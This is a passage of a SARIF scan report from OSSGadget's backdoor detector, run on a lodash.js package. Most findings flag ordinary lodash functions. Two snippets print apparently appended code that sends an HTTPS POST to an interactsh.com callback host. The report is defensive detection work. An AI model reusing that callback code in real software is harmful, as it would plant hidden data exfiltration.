{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 12792,
                  "startColumn": 7,
                  "endLine": 12792,
                  "endColumn": 11,
                  "snippet": {
                    "text": "     * _.at(object, ['a[0].b.c', 'a[1]']);\n     * // => [3, 4]\n     */\n    var at = flatRest(baseAt);\n\n    /**\n     * Creates an object that inherits from the `prototype` object. If a\n",
                    "rendered": {
                      "text": "     * _.at(object, ['a[0].b.c', 'a[1]']);\n     * // => [3, 4]\n     */\n    var at = flatRest(baseAt);\n\n    /**\n     * Creates an object that inherits from the `prototype` object. If a\n",
                      "markdown": "`     * _.at(object, ['a[0].b.c', 'a[1]']);\n     * // => [3, 4]\n     */\n    var at = flatRest(baseAt);\n\n    /**\n     * Creates an object that inherits from the `prototype` object. If a\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17187,
                  "startColumn": 18,
                  "endLine": 17187,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  // Some AMD build optimizers, like r.js, check for condition patterns like:\n  if (typeof define == 'function' && typeof define.amd == 'object' && define.amd) {\n    // Expose Lodash on the global object to prevent errors when Lodash is\n    // loaded by a script tag in the presence of an AMD loader.\n    // See http://requirejs.org/docs/errors.html#mismatch for more details.\n    // Use `_.noConflict` to remove Lodash from the global object.\n    root._ = _;\n",
                    "rendered": {
                      "text": "  // Some AMD build optimizers, like r.js, check for condition patterns like:\n  if (typeof define == 'function' && typeof define.amd == 'object' && define.amd) {\n    // Expose Lodash on the global object to prevent errors when Lodash is\n    // loaded by a script tag in the presence of an AMD loader.\n    // See http://requirejs.org/docs/errors.html#mismatch for more details.\n    // Use `_.noConflict` to remove Lodash from the global object.\n    root._ = _;\n",
                      "markdown": "`  // Some AMD build optimizers, like r.js, check for condition patterns like:\n  if (typeof define == 'function' && typeof define.amd == 'object' && define.amd) {\n    // Expose Lodash on the global object to prevent errors when Lodash is\n    // loaded by a script tag in the presence of an AMD loader.\n    // See http://requirejs.org/docs/errors.html#mismatch for more details.\n    // Use `_.noConflict` to remove Lodash from the global object.\n    root._ = _;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10469,
                  "startColumn": 11,
                  "endLine": 10469,
                  "endColumn": 17,
                  "snippet": {
                    "text": "      }\n\n      function debounced() {\n        var time = now(),\n            isInvoking = shouldInvoke(time);\n\n        lastArgs = arguments;\n",
                    "rendered": {
                      "text": "      }\n\n      function debounced() {\n        var time = now(),\n            isInvoking = shouldInvoke(time);\n\n        lastArgs = arguments;\n",
                      "markdown": "`      }\n\n      function debounced() {\n        var time = now(),\n            isInvoking = shouldInvoke(time);\n\n        lastArgs = arguments;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10436,
                  "startColumn": 11,
                  "endLine": 10436,
                  "endColumn": 17,
                  "snippet": {
                    "text": "      }\n\n      function timerExpired() {\n        var time = now();\n        if (shouldInvoke(time)) {\n          return trailingEdge(time);\n        }\n",
                    "rendered": {
                      "text": "      }\n\n      function timerExpired() {\n        var time = now();\n        if (shouldInvoke(time)) {\n          return trailingEdge(time);\n        }\n",
                      "markdown": "`      }\n\n      function timerExpired() {\n        var time = now();\n        if (shouldInvoke(time)) {\n          return trailingEdge(time);\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10426,
                  "startColumn": 33,
                  "endLine": 10426,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n        // trailing edge, the system time has gone backwards and we're treating\n",
                    "rendered": {
                      "text": "\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n        // trailing edge, the system time has gone backwards and we're treating\n",
                      "markdown": "`\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n        // trailing edge, the system time has gone backwards and we're treating\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10425,
                  "startColumn": 31,
                  "endLine": 10425,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      }\n\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n",
                    "rendered": {
                      "text": "      }\n\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n",
                      "markdown": "`      }\n\n      function shouldInvoke(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime;\n\n        // Either this is the first call, activity has stopped and we're at the\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10416,
                  "startColumn": 33,
                  "endLine": 10416,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n        return maxing\n",
                    "rendered": {
                      "text": "\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n        return maxing\n",
                      "markdown": "`\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n        return maxing\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10415,
                  "startColumn": 31,
                  "endLine": 10415,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      }\n\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n",
                    "rendered": {
                      "text": "      }\n\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n",
                      "markdown": "`      }\n\n      function remainingWait(time) {\n        var timeSinceLastCall = time - lastCallTime,\n            timeSinceLastInvoke = time - lastInvokeTime,\n            timeWaiting = wait - timeSinceLastCall;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 9280,
                  "startColumn": 7,
                  "endLine": 9280,
                  "endColumn": 13,
                  "snippet": {
                    "text": "     * _.find(users, 'active');\n     * // => object for 'barney'\n     */\n    var find = createFind(findIndex);\n\n    /**\n     * This method is like `_.find` except that it iterates over elements of\n",
                    "rendered": {
                      "text": "     * _.find(users, 'active');\n     * // => object for 'barney'\n     */\n    var find = createFind(findIndex);\n\n    /**\n     * This method is like `_.find` except that it iterates over elements of\n",
                      "markdown": "`     * _.find(users, 'active');\n     * // => object for 'barney'\n     */\n    var find = createFind(findIndex);\n\n    /**\n     * This method is like `_.find` except that it iterates over elements of\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17324,
                  "startColumn": 15,
                  "endLine": 17324,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n",
                    "rendered": {
                      "text": "    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n",
                      "markdown": "`    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 13191,
                  "startColumn": 8,
                  "endLine": 13191,
                  "endColumn": 13,
                  "snippet": {
                    "text": "     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n     * // => 'default'\n     */\n    function get(object, path, defaultValue) {\n",
                    "rendered": {
                      "text": "     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n     * // => 'default'\n     */\n    function get(object, path, defaultValue) {\n",
                      "markdown": "`     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n     * // => 'default'\n     */\n    function get(object, path, defaultValue) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 13188,
                  "startColumn": 8,
                  "endLine": 13188,
                  "endColumn": 13,
                  "snippet": {
                    "text": "     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n",
                    "rendered": {
                      "text": "     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n",
                      "markdown": "`     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n     * // => 3\n     *\n     * _.get(object, 'a.b.c', 'default');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 13185,
                  "startColumn": 8,
                  "endLine": 13185,
                  "endColumn": 13,
                  "snippet": {
                    "text": "     *\n     * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n     *\n     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n",
                    "rendered": {
                      "text": "     *\n     * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n     *\n     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n",
                      "markdown": "`     *\n     * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n     *\n     * _.get(object, 'a[0].b.c');\n     * // => 3\n     *\n     * _.get(object, ['a', '0', 'b', 'c']);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 10618,
                  "startColumn": 22,
                  "endLine": 10618,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            cache = memoized.cache;\n\n        if (cache.has(key)) {\n          return cache.get(key);\n        }\n        var result = func.apply(this, args);\n        memoized.cache = cache.set(key, result) || cache;\n",
                    "rendered": {
                      "text": "            cache = memoized.cache;\n\n        if (cache.has(key)) {\n          return cache.get(key);\n        }\n        var result = func.apply(this, args);\n        memoized.cache = cache.set(key, result) || cache;\n",
                      "markdown": "`            cache = memoized.cache;\n\n        if (cache.has(key)) {\n          return cache.get(key);\n        }\n        var result = func.apply(this, args);\n        memoized.cache = cache.set(key, result) || cache;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5939,
                  "startColumn": 20,
                  "endLine": 5939,
                  "endColumn": 25,
                  "snippet": {
                    "text": "     * @returns {*} Returns the metadata for `func`.\n     */\n    var getData = !metaMap ? noop : function(func) {\n      return metaMap.get(func);\n    };\n\n    /**\n",
                    "rendered": {
                      "text": "     * @returns {*} Returns the metadata for `func`.\n     */\n    var getData = !metaMap ? noop : function(func) {\n      return metaMap.get(func);\n    };\n\n    /**\n",
                      "markdown": "`     * @returns {*} Returns the metadata for `func`.\n     */\n    var getData = !metaMap ? noop : function(func) {\n      return metaMap.get(func);\n    };\n\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5851,
                  "startColumn": 28,
                  "endLine": 5851,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n      }\n",
                    "rendered": {
                      "text": "      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n      }\n",
                      "markdown": "`      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5850,
                  "startColumn": 28,
                  "endLine": 5850,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        }\n      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n",
                    "rendered": {
                      "text": "        }\n      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n",
                      "markdown": "`        }\n      }\n      // Check that cyclic values are equal.\n      var objStacked = stack.get(object);\n      var othStacked = stack.get(other);\n      if (objStacked && othStacked) {\n        return objStacked == other && othStacked == object;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5799,
                  "startColumn": 29,
                  "endLine": 5799,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            return false;\n          }\n          // Assume cyclic values are equal.\n          var stacked = stack.get(object);\n          if (stacked) {\n            return stacked == other;\n          }\n",
                    "rendered": {
                      "text": "            return false;\n          }\n          // Assume cyclic values are equal.\n          var stacked = stack.get(object);\n          if (stacked) {\n            return stacked == other;\n          }\n",
                      "markdown": "`            return false;\n          }\n          // Assume cyclic values are equal.\n          var stacked = stack.get(object);\n          if (stacked) {\n            return stacked == other;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5685,
                  "startColumn": 28,
                  "endLine": 5685,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n      }\n",
                    "rendered": {
                      "text": "      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n      }\n",
                      "markdown": "`      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 5684,
                  "startColumn": 28,
                  "endLine": 5684,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return false;\n      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n",
                    "rendered": {
                      "text": "        return false;\n      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n",
                      "markdown": "`        return false;\n      }\n      // Check that cyclic values are equal.\n      var arrStacked = stack.get(array);\n      var othStacked = stack.get(other);\n      if (arrStacked && othStacked) {\n        return arrStacked == other && othStacked == array;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 3678,
                  "startColumn": 25,
                  "endLine": 3678,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n      var objValue = safeGet(object, key),\n          srcValue = safeGet(source, key),\n          stacked = stack.get(srcValue);\n\n      if (stacked) {\n        assignMergeValue(object, key, stacked);\n",
                    "rendered": {
                      "text": "    function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n      var objValue = safeGet(object, key),\n          srcValue = safeGet(source, key),\n          stacked = stack.get(srcValue);\n\n      if (stacked) {\n        assignMergeValue(object, key, stacked);\n",
                      "markdown": "`    function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {\n      var objValue = safeGet(object, key),\n          srcValue = safeGet(source, key),\n          stacked = stack.get(srcValue);\n\n      if (stacked) {\n        assignMergeValue(object, key, stacked);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 2706,
                  "startColumn": 25,
                  "endLine": 2706,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      }\n      // Check for circular references and return its corresponding clone.\n      stack || (stack = new Stack);\n      var stacked = stack.get(value);\n      if (stacked) {\n        return stacked;\n      }\n",
                    "rendered": {
                      "text": "      }\n      // Check for circular references and return its corresponding clone.\n      stack || (stack = new Stack);\n      var stacked = stack.get(value);\n      if (stacked) {\n        return stacked;\n      }\n",
                      "markdown": "`      }\n      // Check for circular references and return its corresponding clone.\n      stack || (stack = new Stack);\n      var stacked = stack.get(value);\n      if (stacked) {\n        return stacked;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 2366,
                  "startColumn": 26,
                  "endLine": 2366,
                  "endColumn": 31,
                  "snippet": {
                    "text": "     * @returns {*} Returns the entry value.\n     */\n    function stackGet(key) {\n      return this.__data__.get(key);\n    }\n\n    /**\n",
                    "rendered": {
                      "text": "     * @returns {*} Returns the entry value.\n     */\n    function stackGet(key) {\n      return this.__data__.get(key);\n    }\n\n    /**\n",
                      "markdown": "`     * @returns {*} Returns the entry value.\n     */\n    function stackGet(key) {\n      return this.__data__.get(key);\n    }\n\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 2219,
                  "startColumn": 34,
                  "endLine": 2219,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     * @returns {*} Returns the entry value.\n     */\n    function mapCacheGet(key) {\n      return getMapData(this, key).get(key);\n    }\n\n    /**\n",
                    "rendered": {
                      "text": "     * @returns {*} Returns the entry value.\n     */\n    function mapCacheGet(key) {\n      return getMapData(this, key).get(key);\n    }\n\n    /**\n",
                      "markdown": "`     * @returns {*} Returns the entry value.\n     */\n    function mapCacheGet(key) {\n      return getMapData(this, key).get(key);\n    }\n\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.js"
                },
                "region": {
                  "startLine": 17314,
                  "startColumn": 4,
                  "endLine": 17314,
                  "endColumn": 12,
                  "snippet": {
                    "text": "});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n",
                    "rendered": {
                      "text": "});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n",
                      "markdown": "`});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
